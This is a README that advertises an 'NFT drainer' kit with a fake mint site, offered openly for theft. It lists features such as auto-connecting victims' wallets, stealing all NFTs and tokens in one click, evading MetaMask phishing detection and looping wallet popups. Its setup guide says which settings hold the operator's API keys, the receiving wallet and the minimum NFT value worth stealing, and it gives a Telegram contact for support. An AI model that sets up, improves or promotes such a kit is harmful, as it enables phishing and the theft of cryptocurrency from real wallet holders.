# nft-drainer-with-fake-mint
Powerful NFT Drainer with Fake Mint Site ! No backdoor wallets clean code !

### ⚠️ If you need any help, DM me here: [@SynxUzu](https://t.me/SynxUzu)

## 🖼️ NFT Stealer / Drainer Template

![preview](https://cdn.discordapp.com/attachments/1044605595384299544/1050768116357021797/image.png)

# 💡 Features
- [x] Multi-browser compatible.
- [x] Compatible to all web hosting.
- [x] Auto Connect Wallet.
- [x] Steals all NFT'S with one click.
- [x] Instant ETH/USDT transactions.
- [x] Fake Mint Notification.
- [x] Fully Automated Transfers Directly to your address.
- [x] Anti Metamask Phishing Detections
- [x] No backdoor


# 🖍️ Setup Guide: 
you need to edit the **settings.js** file. 
- line 2: const infuraId = `"APP ID";` replace **APP ID with your Infura ID**
- line 3: const moralisApi = `"X-API-KEY";` replace **X-API-KEY with your Moralis web3 api key**
# 🖍️ For wallet
you need to edit the **assets/js/wallet.js** file
- line 10: const adress = `"YOUR ETH WALLET";` replace **YOUR WALLET with your ETH wallet address.**

  - Also, line after "const mintInfo" will change the minting price, the maximum supply, the minimum to be minted if the person doesn't have any NFTs, the maximum to be minted...
  - Line "askMintLoop: true" = metamask popup will open again and again until the popup is closed.

# ☁️ Important : 

- Lines after **"const drainNftsInfo"** will be used for the NFT drainer.
- Edit lines : nftReceiveAddress: "YOUR ETH WALLET", replace YOUR WALLET with your ETH wallet address in assets/js/wallet.js"
- Line "minValue: 0.2," is the minimum value of a NFT before it gets stolen. Exemple : If you change this value to 1, the script will only steal NFTs that have a value higher to 1.

To get instant support, contact me on my [@SynxUzu](https://t.me/SynxUzu)

# 👻 Why it doesn't show my address?

This **NFT stealer** interacts directly with the **nft contract** to transfer it to your address located in the **settings.js** file.
![view](https://media.discordapp.net/attachments/964872997750067240/968100664527945798/Untitled-z1.png)
